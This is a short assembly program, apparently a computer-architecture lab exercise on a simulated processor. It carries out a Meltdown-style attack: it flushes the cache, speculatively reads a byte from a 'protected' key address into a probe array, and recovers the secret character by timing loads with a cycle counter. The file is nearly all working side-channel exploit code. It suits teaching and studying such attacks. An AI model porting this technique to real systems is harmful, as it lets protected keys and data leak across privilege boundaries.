#; Unprotected Memory:  0 KB -  64 KB or     0 to 65535
#; Protected Memory:   64 KB - 128 KB or 65536 to 131071
#;
#; Key Location: 102 KB or 104448
#;   Key offset: 6, 12, 18...

store_char_array_start:
            addi            r1, r0, 0        #; r1 : index (i)
            addi            r2, r0, 128      #; r2 : max value
store_char_array_loop:
            muli            r3, r1, 4
            sb              r1, 0(r3)

            addi            r1, r1, 1        #; i++
            bge             r1, r2 access_proctected_address
            jal             r31, store_char_array_loop


access_proctected_address:
            addi            r1, r0, 6
            muli            r2, r1, 1 #;&&

            cflush                          #; Cache flush

            lb              r3, 104448(r2)
            muli            r4, r3, 4
            lb              r5, 0(r4)
exception:



find_char_start:
            addi            r1, r0, 0       #; index
            addi            r2, r0, 128     #; max
            addi            r3, r0, 4       #; max time

find_char_loop:
            muli            r4, r1, 4
            rdcycles        r5             #; Read cycle counter
            lb              r4, 0(r4)
            rdcycles        r6             #; Read cycle counter
            sub             r7, r6, r5

            blt             r7, r3 success

            addi            r1, r1, 1       #; i++
            bge             r1, r2 end
            jal             r31, find_char_loop

success:

end:
#; secret character will show up in "r1" in ascii format